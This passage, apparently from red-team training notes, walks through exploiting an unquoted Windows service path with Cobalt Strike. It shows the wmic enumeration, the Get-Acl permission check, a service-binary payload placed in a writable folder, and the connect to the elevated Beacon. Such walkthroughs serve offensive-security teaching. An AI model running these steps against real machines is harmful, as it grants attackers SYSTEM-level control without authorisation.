An unquoted service path is where the path to the service binary is not wrapped in quotes. Why is that a problem? By itself it's not, but under specific conditions it can lead to an elevation of privilege.

WMI can be used to pull a list of every service and the path to its executable. Here are some examples:
```shell
beacon> run wmic service get name, pathname

Name                                      PathName
ALG                                       C:\Windows\System32\alg.exe
AppVClient                                C:\Windows\system32\AppVClient.exe
AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
[...snip...]
Vuln-Service-1                            C:\Program Files\Vuln Services\Service 1.exe
```

We can see that the paths for **ALG** and **AppVClient** are not quoted, but the path for **AmazonSSMAgent** is. The difference is that this latter path has **spaces** in them. **Vuln-Service-1** has spaces in the path **and** is also not quoted - this is condition #1 for exploitation.

When Windows attempts to read the path to this executable, it interprets the space as a terminator. So it will attempt to execute the following (in order):

1.  `C:\Program.exe`
2.  `C:\Program Files\Vuln.exe`
3.  `C:\Program Files\Vuln Services\Service.exe`

If we can drop a binary into any of those paths, the service will execute it before the real one. Of course there's no guarantee that we have permissions to write into either of them - this is condition #2.

The PowerShell **Get-Acl** cmdlet will show the permissions of various objects (including files and directories).
```shell
beacon> powershell Get-Acl -Path "C:\Program Files\Vuln Services" | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Vuln Services
Owner  : BUILTIN\Administrators
Group  : WKSTN-1\None
Access : CREATOR OWNER Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  Write, ReadAndExecute, Synchronize
         NT SERVICE\TrustedInstaller Allow  FullControl
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize

         C)(A;OICI;0x1200a9;;;S-1-15-2-2)
```

We can see from the output that **BUILTIN\\Users** have **Write** access to `C:\Program Files\Vuln Services`.

Payloads to abuse services must be specific "service binaries". We can do this in Cobalt Strike via **Attacks > Packages > Windows Executable (S)** and selecting the **Service Binary** output type.

You will not see a Beacon appear automatically. When the service has been started and the Beacon executed, you should see that port you used in your TCP listener configuration (in my case **4444**) is listening on **127.0.0.1**.

```shell
beacon> run netstat -anp tcp
[...snip...]
TCP    127.0.0.1:4444         0.0.0.0:0              LISTENING
```

The Beacon is waiting for us to connect to it, which we do with the **connect** command.
```shell
beacon> connect localhost 4444
[+] established link to child beacon: 10.10.17.231
```
